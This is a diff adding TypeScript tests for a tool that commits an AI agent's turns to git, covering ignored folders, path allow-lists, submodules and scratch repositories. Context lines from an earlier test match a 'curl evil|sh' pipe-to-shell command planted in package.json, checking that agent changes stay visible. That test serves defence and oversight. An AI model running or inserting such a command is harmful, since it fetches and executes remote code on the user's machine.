@@ -332,3 +332,55 @@ test("attributes the agent wrote cannot hide a change from the Changes view or t
   assert.match((await c.diff(r.since, 100_000)).patch, /curl evil\|sh/);
   assert.match(await c.diffUnder(r.since, sha, "package.json", 100_000), /curl evil\|sh/);
 });
+
+test("a stepped turn commits a tracked file inside an ignored folder, deletions, and only allowed paths", async (t) => {
+  const r = repo(t);
+  mkdirSync(join(r.dir, "build"));
+  writeFileSync(join(r.dir, "build", "kept.txt"), "1\n");
+  r.g("add", "-f", "build/kept.txt");
+  r.g("commit", "-qm", "build");
+  const since = r.g("rev-parse", "HEAD");
+  // `git add` with a literal path fails on a tracked file in an ignored
+  // folder; the turn still commits.
+  writeFileSync(join(r.dir, ".gitignore"), "build/\n.console-uploads/\n");
+  writeFileSync(join(r.dir, "build", "kept.txt"), "2\n");
+  writeFileSync(join(r.dir, "build", "new.txt"), "ignored\n");
+  r.g("rm", "-q", "notes.md");
+  writeFileSync(join(r.dir, "package.json"), '{"x":1}\n');
+  const c = new Clone(launcher, r.dir);
+  const only = (p: string) => p !== "package.json";
+  const sha = (await c.commitTurn("turn", "A", "a1", { only, since }))!;
+  assert.equal(r.g("diff", "--name-only", since, sha), ".gitignore\nbuild/kept.txt\nnotes.md");
+  assert.equal(r.g("show", `${sha}:build/kept.txt`), "2");
+  assert.equal(r.g("diff", "--cached", "--name-only"), "");
+  assert.equal(readFileSync(join(r.dir, "package.json"), "utf8"), '{"x":1}\n');
+});
+
+test("a stepped turn leaves out a submodule pointer the step does not allow, whatever diff.ignoreSubmodules says", async (t) => {
+  const r = repo(t);
+  const vendor = join(r.dir, "vendor");
+  mkdirSync(vendor);
+  const v = (...args: string[]) => execFileSync("git", ["-c", "user.name=a", "-c", "user.email=a@b", ...args], { cwd: vendor, env: ENV, encoding: "utf8" }).trim();
+  v("init", "-q");
+  v("commit", "-q", "--allow-empty", "-m", "one");
+  r.g("add", "vendor");
+  r.g("commit", "-qm", "vendor");
+  const since = r.g("rev-parse", "HEAD");
+  r.g("config", "diff.ignoreSubmodules", "all");
+  v("commit", "-q", "--allow-empty", "-m", "two");
+  writeFileSync(join(r.dir, "notes.md"), "n2\n");
+  const c = new Clone(launcher, r.dir);
+  const sha = (await c.commitTurn("turn", "A", "a1", { only: (p) => p === "notes.md", since }))!;
+  assert.equal(r.g("diff", "--name-only", "--ignore-submodules=none", since, sha), "notes.md");
+});
+
+test("a scratch repository in the Console's temporary folder does not stop a turn's commit", async (t) => {
+  const r = repo(t);
+  const scratch = join(r.dir, ".console-tmp", "scratch");
+  mkdirSync(scratch, { recursive: true });
+  execFileSync("git", ["init", "-q"], { cwd: scratch, env: ENV });
+  writeFileSync(join(r.dir, "notes.md"), "n2\n");
+  const c = new Clone(launcher, r.dir);
+  const sha = (await c.commitTurn("turn", "A", "a1", { only: (p) => p === "notes.md", since: r.since }))!;
+  assert.equal(r.g("diff", "--name-only", r.since, sha), "notes.md");
+});
